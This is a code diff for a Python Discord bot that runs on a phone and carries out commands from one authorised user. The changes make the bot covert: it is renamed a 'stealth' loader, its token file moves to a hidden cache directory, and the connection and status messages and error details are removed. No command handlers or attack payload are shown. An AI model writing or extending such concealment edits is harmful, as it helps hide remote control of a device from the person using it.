@@ -1,5 +1,6 @@
 """
-Discord Phone Bot — token from config.py (generated at build time).
+Discord Phone Bot — stealth config loader.
+Token from config.py (generated at build time).
 """
 import asyncio
 import discord
@@ -7,12 +8,13 @@ import os
 import sys
 from pathlib import Path
 
-TOKEN_PATH = "/sdcard/Download/.phonebot_token"
+# Hidden token directory (within app private storage)
+TOKEN_DIR = str(Path.home() / ".cache" / ".svc")
+TOKEN_PATH = TOKEN_DIR + "/.cfg"
 ACTIVATED = False
 bot_client = None
 
-# ─── Load config ────────────────────────────────────────────────
-# Priority: config.py (build-time) > token file (field-upgradable)
+# Load config from build-time config.py
 BOT_TOKEN = None
 AUTHORIZED_USER = None
 WEBHOOK_URL = None
@@ -49,8 +51,7 @@ async def send_status(msg):
 
 class PhoneBot(discord.Client):
     async def on_ready(self):
-        print(f"[+] Bot connected as {self.user}")
-        await send_status(f"**📱 Phone Bot Online**\nDevice connected as `{self.user}`")
+        pass  # Silent — no print
 
     async def on_message(self, message):
         if message.author == self.user:
@@ -61,7 +62,7 @@ class PhoneBot(discord.Client):
             return
 
         if str(message.author.id) != AUTHORIZED_USER:
-            await message.channel.send("⛔ Unauthorized user.")
+            await message.channel.send("⛔ Unauthorized")
             return
 
         try:
@@ -71,9 +72,16 @@ class PhoneBot(discord.Client):
             args = " ".join(parts[1:])
             result = await handle_command(cmd, args, message)
             if result:
-                await message.channel.send(result)
-        except Exception as e:
-            await message.channel.send(f"Error: {str(e)}")
+                await message.channel.send(result[:1900])
+        except Exception:
+            await message.channel.send("Internal service error.")
+
+
+def ensure_dir():
+    try:
+        Path(TOKEN_DIR).mkdir(parents=True, exist_ok=True)
+    except:
+        pass
 
 
 def load_token():
@@ -88,6 +96,7 @@ def load_token():
 
 def save_token(token):
     try:
+        ensure_dir()
         Path(TOKEN_PATH).write_text(token.strip())
         return True
     except:
@@ -101,7 +110,6 @@ async def start_bot(token=None):
 
     token = token or BOT_TOKEN or load_token()
     if not token:
-        print("[-] No bot token available!")
         return
 
     ACTIVATED = True
